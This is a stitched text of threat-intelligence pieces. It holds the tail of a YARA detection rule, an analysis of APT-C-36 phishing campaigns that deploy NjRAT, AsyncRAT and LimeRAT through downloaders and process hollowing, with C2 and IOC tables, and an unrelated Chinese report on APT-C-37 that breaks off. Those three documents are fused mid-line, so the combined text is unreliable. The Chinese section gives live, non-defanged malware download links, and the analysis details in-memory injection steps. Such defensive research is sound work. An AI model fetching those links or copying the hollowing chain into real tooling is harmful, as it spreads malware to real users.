97A650064775953697A6500647758436F756E74436861727300647759436F756E74436861727300647746696C6C41747472}
$h1 = {000004200101022901002434353136453045312D354330452D344234452D394133322D39453337453233453734323600000C01000731
2E302E302E3000004901001A2E4E45544672616D65776F726B2C5665}
condition:
uint16(0) == 0x5A4D and filesize < 100KB and 1 of ($h*)
Disclaimer: The private version of this report is available upon request. It includes but is not limited to the complete and contextual MITRE ATT&CK® mapping, MITRE D3FEND™ countermeasures, and other threat detection content for tooling, network traffic, complete IOCs list, and system behavior. Please email us at cti@blackberry.com for more information.
About The BlackBerry Research & Intelligence Team
The BlackBerry Research & Intelligence team examines emerging and persistent threats, providing intelligence analysis for the benefit of defenders and the organizations they serve.Last February a Blackberry report alluded to one of APT-C-36 campaigns (Blind Eagle). The APT-C-36 group has many similarities in terms of tactics, techniques and procedures (TTPs) with the group Hagga / Aggah, as we have been able to observe at Lab52. Particularly, this article describes one of the campaigns that has been linked to APT-C-36, where the artefacts used are noticeable Hagga artefacts.
This group’s campaigns during the last quarter are summarised in the following image.
APT-C-36: last campaigns
The diagram refers to the malware that is actually executed after the infection phase, i.e., after successful deployment of the first stages of the infection process. In fact, it is a successful deployment which will allow the malware to be executed, and which also allows the identification of TTPs prior to full compromise.
Going back to the previous image, the following should be noted:
From December 2, 2022 until February 2, 2023, multiple campaigns were observed deploying NjRat in its final stage.
On February 20, a campaign was observed which varied slightly in its deployment, and which purpose was the deployment of AsyncRat .
By the end of February was observed the use of LimeRAT , but with a very similar operation in the deployment used during the rest of the campaigns, from the first ones whose objective was the execution of NjRAT.
This last point has caught the attention of the Lab52 team, since, as analysed in previous articles , LimeRat is considered an evolution of NjRAT. Moreover, this takes place in a context in which the previous NjRAT campaigns linked to APT-C-36 are still fresh and, in fact, NjRAT is an active malware through campaigns of various actors.
In this post we are going back to the December 5, 2022 campaign to explain in detail the deployment process of the malware in 5 stages observed until triggering NjRAT, considering this campaign as a case study. The objective is to show, by means of a simplified comparison, how the deployment for these RATs is very similar. In addition, It is provided a list of the IOCs of the previous campaigns, a summary of the behaviour in communications and a comparison of the adaptations/ modifications made in the last campaign that triggers in LimeRAT.
Preparing the path for NjRAT: the beginning
This analysis takes as a starting point a post on twitter which shows a document with APT-C-36 compatible techniques and appearances. As a part of that post, a .docx file hash is obtained used for doing the phishing, which data is shown below:
file Juzgado 09 civil del circuito de Bogotá D. C. Col..docx
md5 4a69b0a3796dd688d57e11658ac1058c
sha1 e707fe51fb330b7aed5db5882b316dde1ef5f5a9
sha256 dfc497c7cb4cac21d5b4760dcc9df8c4379e7f4290a8ff06265225704819761c
File properties
The following picture shows the file appearance once it is opened using Microsoft word.
Malicious document appearance
This group is characterised by the impersonation of official entities . As it can be seen, another of their characteristics is to keep a good level of appearance in the text and fake documents used in spear phishing campaigns .
The document is revised to see which is the trigger of the infection, finding a suspicious OLE object (Object Linking and Embedding) which in turn will lead to a WSF file (Windows Script File).
OLE objetc
The analysis is structured around the stages of the malware based on the previous resource. The following image shows the summary of the stages identified.
Analysed activity flow
The final purpose of the malware in this case is the deployment of the remote access trojan (RAT) NjRAT, but it is the way to such deployment that motivates the analysis which is described below; a set of procedures that are in fact been maintained with little variation through the rest of campaings until the date.
Particularly, it should be noted that various stages of the malware deployment are produced entirely in memory , making detection by antivirus tools more challenging.
This article will address the deployment chain in five stages, to then make a comparison between this operation and the last campaign in which LimeRat is deployed. In addition, findings regarding the behaviour of the campaigns with respect to the communications model are included. Finally, the indicators of compromise of the different campaigns are summarised for possible consultation.
Satage 1: Infection using an OLE object
As anticipated, in the 5th of december campaign, the malicious file contains an OLE object whose properties are investigated, inside a controlled environment.
OLE object properties
As can be seen, when the object is activated, it will produce the execution of a WSF file (Windows Script File), Notificación Jurídica.wsf , and thus triggering the infection in the machine.
OLE object detailed
Without further complication at this point, the files script can be extracted to do the analysis:
Script WSF
The file has numerous repeated lines exactly the same to camouflage inside a piece of malicious code.
Broadly speaking, in the WSF file, we can see the definition of a job in VBS language that, through powershell, will download a VBS file from the domain cdn.discordapp[.]com and then launch it via Explorer. The VBS script will later be deleted from the system. This file is analysed below.
Satage 2: Camouflaged downloader
To carry on with the infection chain it is revised the VBS file downloaded, to which allusion is made with the Debug.vbs name, because of its later reference in the code. Indeed, at this point of the execution, this file can take any name, depending also on the campaign. The key issue here is that the script shows the appearance of a legitimate Microsoft WinRM file.
VBS script: first view
However, after a detailed analysis the section which triggers the malicious logic can be seen.
VBS implant in WinRM.vbs file
In fact, it can be seen that the code is obfuscated, although after some operations it is possible to extract the original code it executes:
Malicious code deobfuscated
Specifically, an array of bytes in memory is declared to hold a PE file downloaded from the above IP after Base64 decoding. This file corresponds to a DLL (DLL.PPAM) and will be loaded into memory within the application domain of the current powershell process.
Subsequently, the VAI method of the Fiber.Home class will be invoked by passing it as a parameter the URL written in reverse that can be seen at the end of the image. This will cause it to execute in a fileless way, making it more complicated to detect with antivirus tools.
Satage 3: First DLL injected inside the powershell environment: DLL.PAM (Fiber.dll)
As it has been indicated, the first DLL injected in the powershell environment will be DLL.PPAM (Fiber.dll).
md5 2552287b4733078f12b4a831c698cab6
sha1 c615919f27daeeab06be9a669bebd547e557bf38
sha256 7f0289f08df904da436b8e99605e74518c29f3321a10c7c0b37fced0f1e93202
Fiber.dll signature
Going into further detail, DLL.PPAM is a .NET DLL with Yano protector (1.X).
Fiber.dll properties
After reviewing the general properties of the DLL it can be observed the original name of the DLL: Fiber.dll .
Original name file
No obfuscation or similar action by the protector is appreciated.
Entry Point (EP) in Fiber.dll (third stage)
Fiber.dll checks if the file C:\Windows\Temp\Debug.vbs exists on the computer. If so, Fiber.dll uses the name it was given in the previous step, to refer to it. If no such file exists, it copies the .vbs from the current path to the location mentioned under the name Debug.vbs. This file is the one that persists on the machine and the one that will be launched when the user session is started as seen in the persistence previously.
It then performs a series of consecutive steps in an infinite loop to prepare and trigger the next stages of infection.
Download and preparation of the injector (fourth stage)
In particular, it is observed that it downloads resources that will be used in the next phase of the infection. Once the download is done, it prepares the received data by reverting the obfuscated paths.
Download and preparation of the RAT (final payload)
Similar to the previous block, it also downloads the RAT that will eventually be deployed on the machine. In this case the URL downloaded it is received as a parameter when invoking the DLL with a simple obfuscation (reverse text). It also constructs a path that will be used later to pass the value as a parameter in the next stage.
The next step is to ensure persistence in a simple but functional way:
Persistence
As can be seen, the persistence is done by creating a link in the user’s Startup folder, camouflaging itself under the guise of Notepad.
Startup persistence
Invocation of stage 4 (injector)
Finally, it loads a payload (injector) obtained in the first download into the current application domain. Once the base64 encoding has been decoded, it invokes the “Ande” method of the “Tools” class of the “FSociety” module, passing as arguments the path previously constructed from the .NET path and the payload received from the second download, after decoding the base64 encoding as well.
Stage 4: Second DLL injected inside the powershell environment: RUMP.DLL (Fsociety.dll)
At this stage the malware is already operating with fileless files in memory. In this case, we focus on the second DLL that will be injected into powershell space, rump.dll (fsociety.dll). The hashes that define this artefact are listed below:
md5 a703c90e7ed1b0eb8ab552ec112f46c1
sha1 b7e6a0a39e50383823f0d48db77347a3dc2fdbbc
sha256 5d910ee5697116faa3f4efe230a9d06f6e3f80a7ad2cf8e122546b10e34a0088
Fsociety.dll signature
This is another unpacked .NET DLL with the same protector: Yano (1.X).
Fsociety.dll properties
After a static review of the binary, it shows that the import of functions clearly associated with process injection:
Import of the injection functions
The original name of this DLL is Fsociety.dll.
Original name of the DLL injector
The method used during the execution of the third phase will expect two parameters:
Route of the binary where the final payload will be injected: C:\windows\Microsoft.Net\Framework\4.0.30319\RegAsm.exe
Final payload (NjRAT).
“Ande” method in the “Tool” Class (Fsociety.dll)
This function will be used to trigger the whole process of launching and injecting the final payload (NjRAT).
This binary, as we have seen above, imports functions associated with the injection/management of processes/sections/threads, etc. Therefore, since they are not implemented within the C# code, the malware must import them from external libraries (kernel32.dll). So, as a result, the following API functions are declared by the malware.
Declaration of API functions
The main functionality of this binary is to inject NjRAT using the Process Hollowing technique, as will be shown later.
To describe and clarify the behavior of the malicious dll, the detailed steps performed by the malware until the injection becomes effective are shown below:
1.- A legitimate suspended RegAsm.exe process is created by calling to CreateProcess:
Creation of the victim process
2.- The GetThreadContext is obtained from the Regasm.exe process previously created.
ProcessHollowing: GetThreatContext
3.- A call to ReadProcessMemory is made on RegAsm:
Proces Hollowing: Obtaining the ImageBaseAddress of the victim process
This call reads 4 bytes from the PEB, specifically the IBA (Image Base Address) of the RegAsm process.
Then, it compares the IBA of the binary to be injected, which has been previously obtained, with the IBA of the victim process extracted from the call to ReadProcessMemory. In case they are the same, it makes a call to NTUnMapViewOfSection to unlink the section of the process memory.
4.- A new memory section is reserved with VirtualAllocEx to hold the final NjRAT payload.
Memory reservation for the final payload
As can be seen, 64KB of memory has been reserved under address 0x400000 with read, write and execute (RWX) permissions.
Process Hollowing: New section
At this point of the execution, the content of this memory section remains empty.
Empty content
5.- A call is made to WriteProcessMemory on that section, to proceed to complete that memory area.
Process Hollowing – WriteProcessMemory
Through this call, only the first 512B of the PE header have been written.
Partial header in memory of NjRAT
Then, using the BlockCopy method of the C# Buffer class, another part of the PE is copied to another byte array that will be used later.
Process Hollowing – BlockCopy
And finally the content of this new intermediate array is copied to the reserved section in RegAsm.exe to complete the PE in memory.
Process Hollowing – Write process memory
Partial content of NjRAT
Analogously to the previous one (blockCopy + WriteProcessMemory) another part of the binary (1024Bytes) is copied to the memory of the RegAsm process.
Partial block copy of NjRAT
This set of BlockCopy + WriteProcessMemory calls will be carried out three more times until the total writing of the binary into memory is completed. In total, five BlockCopy + WriteProcessMemory interactions were necessary to write the file completely into memory. Possibly this is a measure to protect against AV detection in memory.
6.- A call is made to SetThreadContext to set the new entry point to the thread.
Process Hollowing – SetThreatContext
7. And finally a call to ResumeThread is made to restart the execution of the new thread.
Process Hollowing – ResumeThread
NjRAT ready for execution
At this point of the execution, the RegAsm process stands out for its CPU consumption and observing the analysis of the generated traffic, the connection attempt against the C2 of NjRAT every 2 seconds stands out.
NjRAT traffic
NjRAT communication
Note: The IP 192.0.2.123 is a simulated IP and does not correspond to the real IP to which prueba30novok.duckdns.org would resolve.
In case any of the previous calls (e.g. VirtualAllocEx) fails to reserve memory in the victim process, the victim process will be terminated and the whole injection chain will be started again from step 1 (CreateProcess).
Instruction for killing RegAsm
Stage 5: NjRAT
A closer look on the RegAsm process shows that NjRAT is indeed loaded in its memory and it is possible to find its configuration parameters:
NjRAT configuration
Finally, once the debugging of the process is finished, it is observed that it does not depend on explorer, and the powershell process that was in charge of launching the dll injector finished its execution being correctly injected NjRAT in the RegAsm.exe process.
Process tree
As already mentioned, the objective of this publication was to get to this point, perhaps in the future we will delve into the analysis of NjRAT, something that is not addressed on this occasion so as not to detract from the publication.
It should be noted that NjRAT has been triggered at this point, but the operation could be maintained to trigger other malware, and it is precisely in this operation where we wanted to keep the focus.
Comparison between APT-C-36 campaigns
In summary, all APT-C-36 campaigns detected during the last quarter are collected here in table form. The objective is to highlight the representative artifact type in each phase for the campaigns.
Artifacts used during the infection
Taking into account that the first stage deals with the hook of the attack (usually a file used for phishing with the camouflaged triggering device), we can simplify the comparison by referring to the most representative files of the rest of the stages.
Althought for the different campaigns the .vbs file of the second phase has a different name, so far we have always identified a file with this extension that would be the protagonist in this stage, which would load fiber.dll and would be used for persistence.
On the other hand, the DLLs of the third and fourth stage are kept as fiber.dll and fsociety.dll. The name of these DLLs changes for the deployment of LimeRAT, in which it should be noted that more obfuscation features are observed.
Dealing with the chain of infection for LimeRAT:
This campaing starts with the file execution ‘DOCUMENTO (FGE).vbs’.
LimeRAT campaign: .vbs
The image shows an obfuscation of the code to finally launch a powershell command:
Obfuscated powershell
After some deofuscation operations, the code that will be executed is obtained:
Deobfuscated powershell
And after removing the other layer of obfuscation, you get to the code that powershell will finally run.
The input method GzeUpA of the .NET module KZUTPv.WUGabK to be loaded into powershell memory is parsed.
The same type of infinite loop is observed with a switch-case structure in which the program flow executes each and every one of the “cases” of the switch-case.
In this case the persistence in the machine will be done by copying the VBS file to the startup folder.
Persistence
Additionally, a scheduled task will be created that will execute the previously created persistence file every minute.
Scheduled task
It has been disabled in order to continue with the analysis.
Visor of the scheduled task
Next, both the DLL injector and the final payload, in this case LimeRAT, are downloaded. The downloads and obfuscations are carried out in a similar way to the case study.
Artifacts downloads
Finally, it will load in the memory of the powershell process the injector DLL and will invoke the PQHWQG method of the AGWNqj.ThUQsn class, passing it as arguments the path of the binary where it will inject the final payload and the LimeRAT payload downloaded previously.
Injector DLL
In this case, an obfuscation of the methods and variables of the loaded DLL is observed.
Obfuscation of methods
Similarly, the same structure of infinite loops is observed with switch-case structures.
It is noted that the defined extern are also obfuscated, although the logic is similar to the detailed NjRAT case study.
Defined externs
Subsequently, as in the case study, the execution flow will be started, which will use the process hollowing technique to inject the LimeRAT payload into the RegAsm.exe process.
As can be seen, a new RegAsm process has been created in a suspended state.
CreateProcess in suspended state
In the following, in order not to extend the article too much, API calls have been omitted as they are similar to the case study detailed above. The only difference is that they have an obfuscation layer.
A review of the memory of the RegAsm process shows that it has successfully injected the final payload.
Payload injection
And as we can see, once the call to ResumeThread happens, the process has been correctly injected and some CPU consumption is observed.
Resume Thread
A review of the generated traffic shows connection attempts to LimeRAT’s C2 approximately every 2 sec.
LimeRAT traffic
LimeRAT traffic encoded
In addition, the creation of a mutex is observed in the processes.
Mutex
The LimeRAT config is extracted in memory from the RegAsm process.
LimeRAT config extracted from memory
Finally, once the injector has finished running, you can see that LimeRAT has been successfully injected and that the RegAsm process no longer depends on powershell.
LimeRAT injected in RegAsm.exe
C2 Infrastructures used by APT-C-36
The analysis on the C2 infraestructures used by APT-C-36 until february 2023 are described in this section.
In summary, it can be seen that in all four campaigns that all the C2 domains used have first resolved to an IP, either from a VPN service or a Hosting service:
Service
Webair Internet Development Company Inc. (webair.com) Hosting
privacyfirst.sh
FDCservers.net
frootvpn.com
M247 Miami Infrastructure (ProtonVPN)
Subsequently, it is observed that in four of the six campaings resolves to an IP associated to an ISP, so as a hypothesis, it is likely that the router is used as a “reverse proxy” to hide the real C2. (See ref [1])
Service
EPM-Telecomunicaciones-S.A.-E.S.P. (epm.net.co)
Colombia-Móvil (tigo.com.co)
The data collected to reach the above conclusions are listed below, in descending chronological order.
LimeRAT (23 Feb 2023)
C2: fortuna777.duckdns[.]org:1994
Resolve Location First Seen Last Seen Info
46.246.12.12 SE 2023-02-23 02:04:00 2023-03-15 17:02:38 frootvpn.com
46.246.6.24 SE 2023-03-04 08:43:36 2023-03-04 08:43:36 frootvpn.com
46.246.80.10 SE 2022-12-26 18:41:27 2023-02-14 06:07:12 frootvpn.com
46.246.12.10 SE 2023-02-02 02:47:49 2023-02-02 02:47:49 frootvpn.com
46.246.6.3 SE 2023-01-29 16:17:41 2023-01-31 01:31:22 frootvpn.com
46.246.26.12 SE 2023-01-14 06:23:17 2023-01-14 06:23:17 frootvpn.com
46.246.14.10 SE 2023-01-07 05:21:02 2023-01-08 06:20:28 frootvpn.com
LimeRAT C2 DNS Resolutions
AsyncRAT (20 Feb 2023)
C2: asy1543.duckdns[.]org:1543
Resolve Location First Seen Last Seen Info
46.246.80.20 SE 2023-03-13 19:57:05 2023-03-15 16:46:22 frootvpn.com
46.246.84.5 SE 2023-03-10 19:40:45 2023-03-12 21:13:29 frootvpn.com
46.246.4.11 SE 2023-03-03 13:44:11 2023-03-08 19:14:03 frootvpn.com
46.246.12.20 SE 2023-03-02 12:18:57 2023-03-03 00:37:27 frootvpn.com
46.246.4.12 SE 2023-03-02 07:56:45 2023-03-02 11:21:21 frootvpn.com
46.246.4.14 SE 2023-03-01 18:50:08 2023-03-02 02:18:26 frootvpn.com
188.126.90.17 SE 2023-02-28 10:13:49 2023-03-01 03:33:10 frootvpn.com
46.246.84.13 SE 2023-02-27 14:00:37 2023-02-27 19:23:28 frootvpn.com
46.246.14.13 SE 2023-02-24 18:53:01 2023-02-25 19:07:26 frootvpn.com
46.246.82.15 SE 2023-02-15 18:36:30 2023-02-23 19:05:40 frootvpn.com
46.246.80.19 SE 2023-02-22 15:40:29 2023-02-23 00:44:24 frootvpn.com
46.246.84.6 SE 2023-02-21 19:16:46 2023-02-21 19:16:46 frootvpn.com
46.246.84.10 SE 2023-02-20 19:28:57 2023-02-21 08:23:17 frootvpn.com
46.246.14.9 SE 2023-02-17 18:36:11 2023-02-19 18:29:42 frootvpn.com
46.246.82.9 SE 2023-02-14 18:02:09 2023-02-14 18:02:09 frootvpn.com
46.246.80.15 SE 2023-02-09 18:42:44 2023-02-13 19:21:14 frootvpn.com
46.246.86.9 SE 2023-02-08 19:05:39 2023-02-08 19:05:39 frootvpn.com
46.246.4.2 SE 2023-02-06 19:04:03 2023-02-07 19:15:42 frootvpn.com
46.246.86.3 SE 2023-02-02 20:47:52 2023-02-06 03:22:54 frootvpn.com
46.246.14.5 SE 2023-02-02 17:22:34 2023-02-02 17:22:34 frootvpn.com
46.246.80.9 SE 2023-02-02 03:10:11 2023-02-02 13:08:58 frootvpn.com
AsyncRAT C2 DNS Resolutions
NjRAT (2 Feb 2023)
C2: env2023nue.duckdns[.]org:1986 → 190.28.222.216
Resolve Location First Seen Last Seen Info
190.28.222.216 CO 2023-02-24 01:59:31 2023-02-24 01:59:31 EPM-Telecomunicaciones-S.A.-E.S.P.
adsl190-28-222-216.epm.net.co
190.28.229.116 CO 2023-02-22 17:44:45 2023-02-22 17:44:45 EPM-Telecomunicaciones-S.A.-E.S.P.
adsl190-28-229-116.epm.net.co
190.28.238.31 CO 2023-02-21 18:59:14 2023-02-22 13:50:13 EPM-Telecomunicaciones-S.A.-E.S.P.
adsl190-28-238-31.epm.net.co
91.192.100.4 CH 2023-02-15 18:03:24 2023-02-20 18:39:18 Datasource-AG
91-192-100-4.gerber.non-logging.vpn
privacyfirst.sh
91.192.100.6 CH 2023-01-31 07:53:10 2023-02-14 02:19:30 Datasource-AG 91-192-100-6.gerber.non-logging.vpn privacyfirst.sh
NjRAT C2 DNS Resolutions
NjRAT (23 Jan 2023)
C2: enero2023.duckdns[.]org:1986 → 190.28.222.216
Resolve Location First Seen Last Seen Info
190.28.222.216 CO 2023-02-24 01:57:10 2023-02-24 01:57:10 EPM-Telecomunicaciones-S.A.-E.S.P.
adsl190-28-222-216.epm.net.co
23.237.25.190 US 2023-01-18 21:48:21 2023-01-18 21:48:21 Cogent-Communications
FDCservers.net
NjRAT C2 DNS Resolutions
NjRAT (5 Dec 2022)
C2: prueba30novok.duckdns[.]org:8002 → NXDOMAIN
Resolve Location First Seen Last Seen
173.225.115.229 US 2022-12-06 18:54:46 2022-12-16 18:43:54
23.237.25.120 US 2022-12-02 04:03:15 2022-12-05 16:43:30
NjRAT C2 DNS Resolutions
23.237.25.12
As can be seen, this IP has been resolved by multiple dynamic domains all associated with duckdns. A reuse of C2 (wins23novok.duckdns[.]org) already used in the December 2 campaign can be observed.
173.225.115.229
NjRAT (2 Dec 2022)
C2: wins23novok.duckdns[.]org:8000 → 191.89.244.1
Resolve Location First Seen Last Seen Info
191.89.244.1 CO 2023-02-07 18:35:36 2023-02-24 01:31:54 Colombia-Mvil
Dinamic-Tigo-191-89-244-1.tigo.com.co
91.192.100.7 CH 2023-01-31 18:32:23 2023-02-04 18:27:34 Datasource-AG
91-192-100-7.gerber.non-logging.vpn
privacyfirst.sh
191.92.97.65 CO 2023-01-28 18:23:51 2023-01-30 18:34:00 Colombia-Mvil
Dinamic-Tigo-191-92-97-65.tigo.com.co
37.120.215.248 US 2023-01-24 18:08:14 2023-01-28 01:18:20 M247-Europe-SRL
M247 Miami Infrastructure
178.73.192.162 SE 2023-01-23 18:36:41 2023-01-23 18:36:41 apdl-asadministracao_dos_portos_do_douro_e_leixoes
c-178-73-192-162.ip4.frootvpn.com
frootvpn.com
23.237.25.161 US 2023-01-20 18:00:21 2023-01-21 18:45:23 Cogent-Communications
FDCservers.net
23.237.25.129 US 2023-01-17 18:30:25 2023-01-19 18:30:12 Cogent-Communications
FDCservers.net
23.237.25.168 US 2023-01-08 17:55:26 2023-01-17 11:50:32 Cogent-Communications
FDCservers.net
23.237.25.120 US 2022-12-02 10:20:22 2023-01-05 18:11:50 Cogent-Communications
FDCservers.net
NjRAT C2 DNS Resolutions
Indicators of Compromise (IOCs)
The compromise indicators observed in the different campaigns seen during the course of this analysis are listed below.
Campaign February 23, 2023 (LimeRAT)
3e1682855ad4035134f6ebd68d56824535b4ca03 DOCUMENTO (FGE).vbs
59170d9b05fa7f3e33d0deaa940798a0bdf4f831 KZUTPv.dll
a2a209d0c24c6218ae4b0d445a47b3f5ec04918e AGWNqj.dll
f043812a9f333d57967d132f31ce43eb33e0e78d LimeRAT.exe
hxxps://firebasestorage.googleapis[.]com/v0/b/lengua-y-literatura-1422e.appspot.com/o/dll.txt?alt=media&token=1c5d4ddd-8eda-411b-9af8-dcb5ccb40c0f
hxxps://firebasestorage.googleapis[.]com/v0/b/proyecto-x-7373e.appspot.com/o/tridimensional.txt?alt=media&token=3ee335b7-99d6-47c9-b7f5-80030d225cc9
hxxps://firebasestorage.googleapis[.]com/v0/b/lengua-y-literatura-1422e.appspot.com/o/Pe.txt?alt=media&token=f89c2bab-01ee-4522-a904-b1664f32d06f
C2: fortuna777.duckdns[.]org:1994
Campaign February 20, 2023 (AsyncRAT)
6D9D0EB5E8E69FFE9914C63676D293DA1B7D3B7B9F3D2C8035ABE0A3DE8B9FCA Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf.uue
430BE2A37BAC2173CF47CA1376126A3E78A94904DBC5F304576D87F5A17ED366 Asuntos_DIAN_N°6440005403992837L2088970004-01-02-2023-pdf.vbs
5399BF1F18AFCC125007D127493082005421C5DDEBC34697313D62D8BC88DAEC Dll.ppam
03B7D19202F596FE4DC556B7DA818F0F76195912E29D728B14863DDA7B91D9B5 Rump.xls
64A08714BD5D04DA6E2476A46EA620E3F7D2C8A438EDA8110C3F1917D63DFCFC AsyncRAT
hxxps://cdn.discordapp[.]com/attachments/1066009888083431506/1070342535702130759/Asuntos_DIAN_N6440005403992837L2088970004-01-02-2023-pdf[.]uue
hxxp://172.174.176[.]153/dll/Dll.ppam
hxxp://172.174.176[.]153/rump/Rump.xls
hxxps://cdn.discordapp[.]com/attachments/1057665255750246403/1070100736463093833/asy.txt
C2: asy1543.duckdns[.]org:1543
Campaign February 2, 2023
fb2c7ccd15fe935524f82ef93d092a4a75049549 Juzgado_11_Civil_Circuito_De_Bogota_-_Notificacio_de_ejecucion_coactiva.docx
42c5a00d9394ee5e1f1481e56a9c6adcc36dd5b9 Juzgado_11_Civil_Circuito_De_Bogota_-_Notificacio_de_ejecucion_coactiva.vbs
882d8bd980285e219d307e4a6db6bc784019c219 Dll.ppam
2c2972950a98b670b1d52d32f7433a1c364384f1 Rump.xls
3d75a0819f035af1b2d5e8e6c7a18a528bd6a91a 2023env.txt
hxxps://cdn.discordapp[.]com/attachments/1042444027016003677/1062824763413762109/Juzgado_11_Civil_Circuito_De_Bogota_-_Notificacio_de_ejecucion_coactiva.vbs
hxxp://172.174.176[.]153/dll/Dll.ppam
hxxp://172.174.176[.]153/rump/Rump.xls
hxxp://cdn.discordapp[.]com/attachments/1042444027016003677/1062794021182898277/2023env.txt
C2: env2023nue.duckdns.org:1986
Campaign January 23, 2023
dc1ac3d9109496765c8155d1c906fa04c47d1a25 Comprobante de pago.vbs
97f20536e6ab3c6dc75859e05e17527366a3f129 hiden.ppa
2c2972950a98b670b1d52d32f7433a1c364384f1 Rump.xls
fdc7dcf2f41888a4b060cebf5c20159f2993b0c6 23enero.txt
hxxps://drive.google[.]com/file/d/1_lpMXe_flv-KQeQfR33uRqDzN4_whSWz/view?usp=drive_web
hxxp://172.174.176[.]153/dll/hiden.ppa
hxxp://172.174.176[.]153/rump/Rump.xls
hxxps://cdn.discordapp[.]com/attachments/1042444027016003677/1067142291736764426/23enero.txt
C2: enero2023.duckdns[.]org:1986
Campaign December 5, 2022
e707fe51fb330b7aed5db5882b316dde1ef5f5a9 Juzgado 09 civil del circuito de Bogotá D.C..docx
54f1d83bd2ad338b51dd7f5ab2d2ce70340ff029 Notificacion Juridica.wsf
f53e9afdd5ba3302186b6be1ac446c9f081c362f 2dode8002.vbs
ec3bc2150f6a915c61432e8bccdf15b58f290d06 Dll.ppam
1773c756220b81e0203f0e6e8342c7b0826531d8 Rump.xls
7000261ab060e877a15aef936cb70db0349a02c8 2dode8002.txt
14d354df391e447f023ddcb7f84ca2fa8e582501 njrat
hxxps://cdn.discordapp[.]com/attachments/1047544891632259145/1047971566543179936/2dode8002.vbs
hxxp://4.204.233[.]44/Dll/Dll.ppam
hxxp://20.238.8[.]87/Online/Rump[.]xls
hxxps://cdn.discordapp[.]com/attachments/1047543449777344516/1047971253056708729/2dode8002.txt
C2: prueba30novok.duckdns[.]org:8002
Campaign December 2, 2022
a5cd7f6bf2a036e52a9df856c16369f5adc8d4a4 NOTARÍA ÚNICA DE LURUACO ATLÁNTICO.docx
6d39c01dcdde807f4cb6f05fd54384fc01c23d4e NOTA MARGINAL.wsf
301fed92d48e2477e6bb070b6854e853 Vbs_Startup_LNK.vbs
2552287b4733078f12b4a831c698cab6 Dll.ppam
b7e6a0a39e50383823f0d48db77347a3dc2fdbbc Rump.xls
9fa72138c12985058af66b328e2adf3a 23nov.txt
hxxps://cdn.discordapp[.]com/attachments/1047544891632259145/1047586477921538178/Vbs_Startup_LNK.vbs
hxxp://4.204.233[.]44/Dll/Dll.ppam
hxxp://20.238.8[.]87/Online/Rump.xls
hxxps://cdn.discordapp[.]com/attachments/1047543449777344516/1047543574381723648/23nov.txt
C2: wins23novok.duckdns[.]org:8000
23.237.25[.]120
Additional information: APT-C-36 and Hagga / Aggah
The Hagga/Aggah group has typically focused on information stealing, having been detected in March 2019 by researchers at PaloAlto-Unit42. Initially it was supposed that the main target of this group were entities within a Middle Eastern country, although subsequent research clarified that the group was active globally, affecting targets in the United States, Europe and Asia. In 2020 Hagga performed a campaign against the Italian manufacturing sector and later that year it was observed selling or renting its malware devices to other actors.
Whether it is because APT-C-36 uses Hagga artefacts or for some other reason that brings them closer together, there are similarities shared by both groups:
Use of a high level of Spanish language in the creation of Spear Phishings.
Downloading payloads from public storage (gdrive, discord).
Use of dynamic domains for C2 (duckdns.org).
Use of possibly compromised Colombian ISP router infrastructure to hide the real C2, using it as a ‘reverse proxy’.
Use of public malware not created by them (NjRAT/AsyncRAT/LimeRAT).
Use of high ports for communication with the C2 (>1024).
Both share the goal of information stealing.
References
[1] – https://lab52.io/blog/apt-c-36-recent-activity-analysis/
[2] – https://marcoramilli.com/2022/11/21/is-hagga-threat-actor-abusing-fsociety-framework/
[3] – https://www.team-cymru.com/post/an-analysis-of-infrastructure-linked-to-the-hagga-threat-actor
[4] – https://lab52.io/blog/apt-c-36-new-anti-detection-tricks/
[5] – https://web.archive.org/web/20191207233315/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/
[6] – https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/
[7] – https://lab52.io/blog/literature-lover-targeting-colombia-with-limerat/
[8] – https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia?utm_medium=social&utm_content=cyber一、 概述
从2015年10月起至今，拍拍熊组织（APT-C-37）针对某武装组织展开了有组织、有计划、针对性的长期不间断攻击。其攻击平台为Windows和Android，截止目前360烽火实验室（360 Beaconlab）一共捕获了Android平台攻击样本32个，Windows平台攻击样本13个，涉及的C&C域名7个。
某武装组织由于其自身的政治、宗教等问题，使其成为了众多黑客及国家的攻击目标。2017年3月，某武装组织Amaq媒体频道发布了一条警告消息，该消息提醒访问者该网站已被渗透，任何访问该网站的人都会被要求下载伪装成Flash安装程序的病毒文件。从消息中我们确定了某武装组织是该行动的攻击目标，其载荷投递方式至少包括水坑式攻击。
通过分析，我们发现拍拍熊组织使用到的一个主要C&C位于中东某国，且和同时期的黄金鼠组织[1]使用的C&C属于同一个网段。进一步分析对比，两个组织有很强的关联性，然两者又包含有各自的特有RAT。
由于拍拍熊组织的攻击目标针对的是某武装组织，支持双平台攻击，另史上曾经出现过唯一一种获有士兵证的中东某国特色动物，结合该组织的一些其它特点以及360对 APT 组织的命名规则，我们将该组织命名为DOTA游戏里的一个角色名----拍拍熊。
图1.1 拍拍熊攻击相关的关键时间事件点
二、 载荷投递
此次拍拍熊组织载荷投递的方式主要为水坑攻击。
Al Swarm新闻社网站（见图2.1）是一个属于某武装组织的媒体网站，同样的原因，使其也遭受着来自世界各地的各种攻击，曾更换过几次域名，网站目前已经下线。拍拍熊组织除了对上述提到的Amaq媒体网站进行水坑攻击外，我们发现Al Swarm新闻社也同样被该组织用来水坑攻击。
图2.1 Al Swarm新闻社网站（注：采用archive获取）
该水坑攻击方式采用的是把Al Swarm站的正常APP替换成一个插入RAT后的恶意APP， 其RAT具体下载链接和链接对应文件MD5见表1。
恶意下载链接
https://sawarim.net/apps/Sawarim.apk
表1 Android端RAT程序具体下载链接和链接对应文件MD5
除了上面两个针对某武装组织新闻媒体网站的水坑攻击外，我们还发现到该组织使用到的一些其它历史水坑攻击见表2，包含了Android端和Windows端RAT程序具体下载链接和链接对应文件MD5。
恶意下载链接
http://androids-app.com/downloads/Youtube_v3_4.apk
恶意下载链接
http://snapcard.argia.co.id/woocommerce/wp-content/plugins/Adobe_FlashPlayerX86_64.exe
恶意下载链接
http://snapcard.argia.co.id/woocommerce/wp-content/plugins/Adobe_FlashPlayer_installX86.exe
拍拍熊组织在这次行动中主要使用以下两种诱导方式：
含有正常APP功能的伪装
